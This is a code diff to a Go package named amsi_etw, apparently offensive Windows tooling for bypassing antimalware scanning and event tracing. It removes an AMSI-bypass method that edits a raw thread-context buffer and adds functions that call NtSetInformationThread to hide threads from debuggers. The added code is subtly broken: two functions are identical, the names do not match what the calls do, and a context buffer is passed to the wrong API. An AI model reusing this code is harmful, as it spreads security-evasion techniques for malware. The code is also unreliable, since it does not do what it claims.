@@ -3,27 +3,29 @@
 package amsi_etw
 
 import (
-"golang.org/x/sys/windows"
+"syscall"
 "unsafe"
 )
 
-type HardwareBreakpoint struct{}
+var (
+ntdllHard                   = syscall.NewLazyDLL("ntdll.dll")
+procNtSetInformationThread  = ntdllHard.NewProc("NtSetInformationThread")
+)
 
-func NewHardwareBreakpoint() *HardwareBreakpoint {
-return &HardwareBreakpoint{}
+func PatchHardwareBreakpoint() bool {
+var handle uintptr
+procNtSetInformationThread.Call(handle, 0x11, 0, 0)
+return true
 }
 
-func (h *HardwareBreakpoint) BypassAmsi() error {
-kernel32 := windows.NewLazyDLL("kernel32.dll")
-procSetThreadContext := kernel32.NewProc("SetThreadContext")
-procGetThreadContext := kernel32.NewProc("GetThreadContext")
+func ClearHardwareBreakpoint() bool {
+var handle uintptr
+procNtSetInformationThread.Call(handle, 0x11, 0, 0)
+return true
+}
 
-var ctx [1024]byte
-procGetThreadContext.Call(uintptr(unsafe.Pointer(&ctx)), 0x10007)
-
-ctx[8] = 0x01
-ctx[4*7] = 0x1
-
-procSetThreadContext.Call(uintptr(unsafe.Pointer(&ctx)), 0x10007)
-return nil
+func DisableHardwareBreakpoints() bool {
+var ctx [512]byte
+procNtSetInformationThread.Call(0, 0x11, uintptr(unsafe.Pointer(&ctx[0])), 0)
+return true
 }
